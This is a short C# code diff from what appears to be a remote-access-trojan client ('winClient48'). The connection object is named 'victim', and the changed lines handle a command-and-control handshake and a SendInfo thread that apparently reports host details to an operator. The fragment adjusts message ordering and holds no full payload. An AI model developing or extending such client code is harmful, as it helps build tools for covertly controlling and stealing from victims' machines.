@@ -451,7 +451,6 @@ namespace winClient48
 
                 victim.fnSslSendRAW(CMD_TLS, PARA_HELLO, clsEZData.fnGenerateRandomStr());
 
-                victim.fnSslSendRAW(1, 0, clsEZData.fnGenerateRandomStr()); 
                 new Thread(() => SendInfo(victim)).Start();
 
                 do
@@ -492,7 +491,7 @@ namespace winClient48
                         }
                         else if (cmd == CMD_TLS && para == PARA_ACK)
                         {
-                            //new Thread(() => SendInfo(victim)).Start();
+                            _ = Task.Run(() => victim.fnSendCmdParam(2, 1));
                         }
                         else if (cmd == 2)
                         {
